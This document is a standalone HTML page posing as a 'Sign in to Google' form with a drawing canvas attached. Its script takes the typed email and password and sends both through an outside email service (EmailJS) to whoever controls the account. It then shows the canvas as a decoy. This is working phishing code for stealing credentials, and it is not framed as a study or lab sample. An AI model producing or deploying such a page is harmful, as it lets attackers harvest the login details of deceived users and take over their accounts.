<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login and Drawing</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f1f1f1;
        }
        .login-container {
            width: 300px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .login-container h2 {
            margin-bottom: 20px;
            text-align: center;
            color: #333;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #4285F4;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container button:hover {
            background-color: #357ae8;
        }
        .drawing-canvas {
            margin-top: 20px;
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Sign in to Google</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Enter your password" required>
            <button type="submit">Next</button>
        </form>
    </div>

    <canvas id="drawingCanvas" class="drawing-canvas" width="500" height="500"></canvas>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("Wm_hgPysMxjkcdYas"); // Initialize EmailJS with User ID
        })();

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Send email with form data
            const templateParams = {
                user_email: email,
                user_password: password
            };

            emailjs.send("service_zrgq0cs", "template_8r7y8vw", templateParams)
                .then(function(response) {
                    console.log("Email sent successfully", response);
                    alert("Form submitted! You will now be redirected to the drawing canvas.");
                    showDrawingCanvas();
                }, function(error) {
                    console.error("Error sending email", error);
                    alert("Failed to send form. Please try again.");
                });
        });

        // Drawing functionality
        let canvas = document.getElementById('drawingCanvas');
        let ctx = canvas.getContext('2d');
        let drawing = false;

        canvas.addEventListener('mousedown', function(event) {
            drawing = true;
            ctx.beginPath();
            ctx.moveTo(event.clientX - canvas.offsetLeft, event.clientY - canvas.offsetTop);
        });

        canvas.addEventListener('mousemove', function(event) {
            if (drawing) {
                ctx.lineTo(event.clientX - canvas.offsetLeft, event.clientY - canvas.offsetTop);
                ctx.stroke();
            }
        });

        canvas.addEventListener('mouseup', function() {
            drawing = false;
        });

        function showDrawingCanvas() {
            document.querySelector('.login-container').style.display = 'none';
            document.getElementById('drawingCanvas').style.display = 'block';
        }
    </script>

</body>
</html>
